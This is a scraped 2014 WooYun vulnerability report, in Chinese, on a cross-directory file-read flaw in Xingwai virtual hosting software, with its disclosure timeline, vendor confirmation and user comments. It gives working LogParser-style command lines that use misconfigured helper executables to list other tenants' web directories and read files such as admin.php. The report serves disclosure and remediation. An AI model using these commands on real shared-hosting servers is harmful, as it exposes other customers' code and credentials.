{"id": 5051, "wybug_id": "wooyun-2014-047969", "wybug_title": "星外虚拟主机跨web目录文件读取漏洞", "wybug_corp": "广州星外信息科技有限公司", "wybug_author": "applychen", "wybug_date": "2014-01-05 22:05", "wybug_open_date": "2014-04-05 22:06", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向公众公开  简要描述： 星外虚拟主机跨目录读取文件漏洞，需要一定条件。 详细说明：  问题发生在以下文件，这些文件都没有严格的设置执行权限，当前的IIS用户能够顺利的利用它们执行命令：\nc:\\windows\\7i24IISLOG.exec:\\windows\\7i24IISLOG2.exec:\\windows\\7i24IISLOG3.exec:\\windows\\7i24IISLOG4.exec:\\windows\\7i24tool.exec:\\windows\\rsb.exe\n这些文件貌似是星外处理日志、设置权限的，其中的7i24IISLOG.exe其实就是LogParser，LogParser是一款强大日志分析工具，下面利用它来列web目录：\nc:\\windows\\7i24IISLOG  \"select top 100 path from e:\\host\\*.*\" -i:FS -rtp:-1\n返回如下：\n\n读取其中一个站的目录信息：\nc:\\windows\\7i24IISLOG  \"select top 100 path from e:\\host\\0233ab\\*.*\" -i:FS -rtp:-1\n\n\n下面读取文件内容：\nc:\\windows\\7i24IISLOG \"select text from e:\\host\\0233ab\\web\\admin.php\" -i:textline -rtp:-1\n\n\n7i24IISLOG3.exe能够打包ISO文件，利用它同样的也可以列出目录文件信息：\nc:\\windows\\7i24IISLOG3 e:\\host\\0233ab\\web\\ c:\\windows\\temp\\123.rar\n\n\n同样的还有rbs.exe\nc:\\windows\\rbs -r -v 024dbjj e:\\host\\0233ab\\web\\*.*\n\n\n   漏洞证明：  同上   修复方案：  设置权限。   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-01-10 14:14 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-05 22:18 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  0day的节奏？    \n     2014-01-05 22:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  毫不犹豫的关注    \n     2014-01-05 23:03 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  0day !    \n     2014-01-06 08:52 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  这个难道就是我们这群小黑苦苦奋斗的星外提权？    \n     2014-01-06 09:27 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @xsser 大牛，这个跟\"框\"攻击的思路一样吗？    \n     2014-01-06 09:43 |    \t\tapplychen \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:16        | 白发现首)\t\t \n  这个一定条件下能跨目录读文件~至于权限提升貌似还不行……    \n     2014-01-06 09:46 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @applychen 嗯，不错，期待细节    \n     2014-01-06 09:49 |    \t\tDestinys \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:5        | Focus web security)\t\t \n  哟哟，0day吖    \n     2014-01-06 10:26 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  cert又有0day了    \n     2014-01-06 11:00 |    \t\t网维 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 为您提供优质服务！)\t\t \n  这个洞一直存在，目录权限是客户端软件自动设置的，如果手动删除目录上的这个权限，主控上自检就会失败。    \n     2014-01-06 15:52 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  果断关注    \n     2014-01-06 18:53 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  mark    \n     2014-01-07 20:54 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  mark    \n     2014-01-16 18:07 |    \t\t黑匣子 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:17        | 我是一个有思想的菜鸟！)\t\t \n  需要一定条件？什么条件啊？    \n     2014-01-30 14:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  不错，这个很不错！    \n     2014-04-06 00:22 |    \t\t贱son \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | GE0)\t\t \n  终于等到你出来了。。    \n     2014-09-05 16:56 |    \t\t孤月寒城 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  0day的节奏    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}